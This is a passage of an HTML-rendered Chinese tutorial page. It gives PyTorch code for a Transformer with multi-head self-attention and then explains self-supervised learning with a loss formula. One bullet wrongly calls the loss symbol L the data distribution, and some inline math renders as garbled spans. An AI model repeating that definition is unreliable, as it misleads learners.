class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn.functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SelfAttention</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, embed_size, heads</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(SelfAttention, self).__init__()</span><br><span class=\"line\">        self.embed_size = embed_size</span><br><span class=\"line\">        self.heads = heads</span><br><span class=\"line\">        self.head_dim = embed_size // heads</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> (</span><br><span class=\"line\">            self.head_dim * heads == embed_size</span><br><span class=\"line\">        ), <span class=\"string\">&quot;Embedding size needs to be divisible by heads&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        self.values = nn.Linear(self.head_dim, self.head_dim, bias=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        self.keys = nn.Linear(self.head_dim, self.head_dim, bias=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        self.queries = nn.Linear(self.head_dim, self.head_dim, bias=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        self.fc_out = nn.Linear(heads * self.head_dim, embed_size)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, values, keys, query, mask</span>):</span><br><span class=\"line\">        N = query.shape[<span class=\"number\">0</span>]</span><br><span class=\"line\">        value_len, key_len, query_len = values.shape[<span class=\"number\">1</span>], keys.shape[<span class=\"number\">1</span>], query.shape[<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Split the embedding into self.heads different pieces</span></span><br><span class=\"line\">        values = values.reshape(N, value_len, self.heads, self.head_dim)</span><br><span class=\"line\">        keys = keys.reshape(N, key_len, self.heads, self.head_dim)</span><br><span class=\"line\">        queries = query.reshape(N, query_len, self.heads, self.head_dim)</span><br><span class=\"line\"></span><br><span class=\"line\">        values = self.values(values)</span><br><span class=\"line\">        keys = self.keys(keys)</span><br><span class=\"line\">        queries = self.queries(queries)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Scaled dot-product attention</span></span><br><span class=\"line\">        energy = torch.einsum(<span class=\"string\">&quot;nqhd,nkhd-&gt;nhqk&quot;</span>, [queries, keys])</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mask <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            energy = energy.masked_fill(mask == <span class=\"number\">0</span>, <span class=\"built_in\">float</span>(<span class=\"string\">&quot;-1e20&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        attention = torch.softmax(energy / (self.embed_size ** (<span class=\"number\">1</span> / <span class=\"number\">2</span>)), dim=<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        out = torch.einsum(<span class=\"string\">&quot;nhql,nlhd-&gt;nqhd&quot;</span>, [attention, values]).reshape(</span><br><span class=\"line\">            N, query_len, self.heads * self.head_dim</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">        out = self.fc_out(out)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> out</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TransformerBlock</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, embed_size, heads, dropout, forward_expansion</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(TransformerBlock, self).__init__()</span><br><span class=\"line\">        self.attention = SelfAttention(embed_size, heads)</span><br><span class=\"line\">        self.norm1 = nn.LayerNorm(embed_size)</span><br><span class=\"line\">        self.norm2 = nn.LayerNorm(embed_size)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.feed_forward = nn.Sequential(</span><br><span class=\"line\">            nn.Linear(embed_size, forward_expansion * embed_size),</span><br><span class=\"line\">            nn.ReLU(),</span><br><span class=\"line\">            nn.Linear(forward_expansion * embed_size, embed_size),</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">        self.dropout = nn.Dropout(dropout)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, value, key, query, mask</span>):</span><br><span class=\"line\">        attention = self.attention(value, key, query, mask)</span><br><span class=\"line\"></span><br><span class=\"line\">        x = self.dropout(self.norm1(attention + query))</span><br><span class=\"line\">        forward = self.feed_forward(x)</span><br><span class=\"line\">        out = self.dropout(self.norm2(forward + x))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> out</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Transformer</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        self,</span></span><br><span class=\"line\"><span class=\"params\">        embed_size,</span></span><br><span class=\"line\"><span class=\"params\">        num_layers,</span></span><br><span class=\"line\"><span class=\"params\">        heads,</span></span><br><span class=\"line\"><span class=\"params\">        device,</span></span><br><span class=\"line\"><span class=\"params\">        forward_expansion,</span></span><br><span class=\"line\"><span class=\"params\">        dropout,</span></span><br><span class=\"line\"><span class=\"params\">        vocab_size,</span></span><br><span class=\"line\"><span class=\"params\">        max_length,</span></span><br><span class=\"line\"><span class=\"params\">    </span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(Transformer, self).__init__()</span><br><span class=\"line\">        self.embed_size = embed_size</span><br><span class=\"line\">        self.device = device</span><br><span class=\"line\">        self.word_embedding = nn.Embedding(vocab_size, embed_size)</span><br><span class=\"line\">        self.position_embedding = nn.Embedding(max_length, embed_size)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.layers = nn.ModuleList(</span><br><span class=\"line\">            [</span><br><span class=\"line\">                TransformerBlock(</span><br><span class=\"line\">                    embed_size,</span><br><span class=\"line\">                    heads,</span><br><span class=\"line\">                    dropout=dropout,</span><br><span class=\"line\">                    forward_expansion=forward_expansion,</span><br><span class=\"line\">                )</span><br><span class=\"line\">                <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_layers)</span><br><span class=\"line\">            ]</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">        self.fc_out = nn.Linear(embed_size, vocab_size)</span><br><span class=\"line\">        self.dropout = nn.Dropout(dropout)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x, mask</span>):</span><br><span class=\"line\">        N, seq_length = x.shape</span><br><span class=\"line\">        positions = torch.arange(<span class=\"number\">0</span>, seq_length).expand(N, seq_length).to(self.device)</span><br><span class=\"line\">        out = self.dropout(self.word_embedding(x) + self.position_embedding(positions))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> layer <span class=\"keyword\">in</span> self.layers:</span><br><span class=\"line\">            out = layer(out, out, out, mask)</span><br><span class=\"line\"></span><br><span class=\"line\">        out = self.fc_out(out)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> out</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 示例用法</span></span><br><span class=\"line\">device = torch.device(<span class=\"string\">&quot;cuda&quot;</span> <span class=\"keyword\">if</span> torch.cuda.is_available() <span class=\"keyword\">else</span> <span class=\"string\">&quot;cpu&quot;</span>)</span><br><span class=\"line\">vocab_size = <span class=\"number\">10000</span></span><br><span class=\"line\">embed_size = <span class=\"number\">256</span></span><br><span class=\"line\">num_layers = <span class=\"number\">6</span></span><br><span class=\"line\">heads = <span class=\"number\">8</span></span><br><span class=\"line\">dropout = <span class=\"number\">0.1</span></span><br><span class=\"line\">forward_expansion = <span class=\"number\">4</span></span><br><span class=\"line\">max_length = <span class=\"number\">100</span></span><br><span class=\"line\">batch_size = <span class=\"number\">32</span></span><br><span class=\"line\">seq_length = <span class=\"number\">50</span></span><br><span class=\"line\"></span><br><span class=\"line\">model = Transformer(embed_size, num_layers, heads, device, forward_expansion, dropout, vocab_size, max_length).to(device)</span><br><span class=\"line\">x = torch.randint(<span class=\"number\">0</span>, vocab_size, (batch_size, seq_length)).to(device)</span><br><span class=\"line\">mask = <span class=\"literal\">None</span>  <span class=\"comment\"># 示例中没有使用mask</span></span><br><span class=\"line\">out = model(x, mask)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(out.shape)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"自监督学习self-supervised-learning\"><a class=\"anchor\" href=\"#自监督学习self-supervised-learning\">#</a> 自监督学习（Self-Supervised Learning）</h2>\n<h3 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h3>\n<p>自监督学习是一种机器学习方法，<strong>通过从未标注的数据中生成监督信号来训练模型</strong>。与监督学习不同，自监督学习不依赖于人工标注的数据集，而是通过设计预训练任务（如预测输入数据的一部分）来生成训练信号。自监督学习广泛应用于图像处理、自然语言处理等领域，能够有效地利用大量未标注数据进行模型预训练，从而在下游任务中实现更好的性能。</p>\n<h3 id=\"公式-2\"><a class=\"anchor\" href=\"#公式-2\">#</a> 公式</h3>\n<p>自监督学习的目标是通过预训练任务来学习数据的有效表示。假设我们有一个输入数据 $ x<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>，自监督学习通过设计预训练任务</mtext></mrow><annotation encoding=\"application/x-tex\">，自监督学习通过设计预训练任务</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">自</span><span class=\"mord cjk_fallback\">监</span><span class=\"mord cjk_fallback\">督</span><span class=\"mord cjk_fallback\">学</span><span class=\"mord cjk_fallback\">习</span><span class=\"mord cjk_fallback\">通</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">设</span><span class=\"mord cjk_fallback\">计</span><span class=\"mord cjk_fallback\">预</span><span class=\"mord cjk_fallback\">训</span><span class=\"mord cjk_fallback\">练</span><span class=\"mord cjk_fallback\">任</span><span class=\"mord cjk_fallback\">务</span></span></span></span> T<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>，从</mtext></mrow><annotation encoding=\"application/x-tex\">，从</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">从</span></span></span></span> x <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>中生成目标</mtext></mrow><annotation encoding=\"application/x-tex\">中生成目标</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">生</span><span class=\"mord cjk_fallback\">成</span><span class=\"mord cjk_fallback\">目</span><span class=\"mord cjk_fallback\">标</span></span></span></span> y$，并通过最小化以下损失函数来训练模型：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi mathvariant=\"script\">L</mi><mo>=</mo><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo><mo>∼</mo><mi>D</mi></mrow></msub><mrow><mo fence=\"true\">[</mo><mi mathvariant=\"normal\">ℓ</mi><mo stretchy=\"false\">(</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">\\mathcal{L}=\\mathbb{E}_{(x,y)\\sim D}\\left[\\ell(f(x),y)\\right]\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\">L</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1052em;vertical-align:-0.3551999999999999em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose mtight\">)</span><span class=\"mrel mtight\">∼</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord\">ℓ</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">L</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{L}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\">L</span></span></span></span></span> 是数据分布</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">ℓ</mi></mrow><annotation encoding=\"application/x-tex\">\\ell</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">ℓ</span></span></span></span> 是损失函数</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi></mrow><annotation encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span></span></span></span> 是模型</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 是通过预训练任务从<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 中生成的目标</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo><mo>∼</mo><mi>D</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\mathbb{E}_{(x,y)\\sim D}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.04409em;vertical-align:-0.3551999999999999em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose mtight\">)</span><span class=\"mrel mtight\">∼</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span></span></span></span> 表示对联合分布<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi></mrow><annotation encoding=\"application/x-tex\">D</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span></span> 上的期望值。\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"double-struck\">E</mi></mrow><annotation encoding=\"application/x-tex\">\\mathbb{E}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68889em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathbb\">E</span></span></span></span></span> 表示期望值</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo><mo>∼</mo><mi>D</mi></mrow><annotation encoding=\"application/x-tex\">(x,y)\\sim D</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∼</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span></span> 表示从联合分布<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi></mrow><annotation encoding=\"application/x-tex\">D</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span></span> 中抽取的样本对<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(x,y)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span></span></span></span>。这里的<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 表示输入数据，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 表示输入数据生成的目标。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"示例代码-2\"><a class=\"anchor\" href=\"#示例代码-2\">#</a> 示例代码</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.optim <span class=\"keyword\">as</span> optim</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.utils.data <span class=\"keyword\">import</span> DataLoader, Dataset</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义数据集</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title 